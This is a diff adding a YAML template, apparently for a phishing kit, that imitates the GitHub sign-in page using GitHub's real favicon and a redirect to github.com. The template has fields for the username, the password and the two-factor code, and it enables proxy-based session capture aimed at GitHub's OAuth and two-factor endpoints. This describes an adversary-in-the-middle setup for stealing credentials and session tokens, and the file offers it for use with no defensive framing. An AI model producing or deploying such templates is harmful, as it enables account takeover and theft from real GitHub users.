@@ -1,0 +1,37 @@
+name: "GitHub Login"
+author: "Sheikh-CoedexTech"
+version: "1.0"
+
+page_title: "Sign in to GitHub"
+company_name: "GitHub"
+logo_url: "https://github.githubassets.com/favicons/favicon.svg"
+favicon_url: "https://github.githubassets.com/favicons/favicon.svg"
+redirect_after: "https://github.com"
+
+fields:
+  - id: login
+    name: login
+    label: Username or email address
+    type: text
+    placeholder: "Enter your username or email"
+    required: true
+  - id: password
+    name: password
+    label: Password
+    type: password
+    placeholder: "Enter your password"
+    required: true
+  - id: otp
+    name: otp
+    label: Two-factor authentication code
+    type: text
+    placeholder: "XXXXXX"
+    required: false
+
+session_capture: true
+session_capture_method: proxy
+
+oauth_endpoints:
+  - "/login/oauth/authorize"
+  - "/login/oauth/access_token"
+  - "/sessions/two-factor"
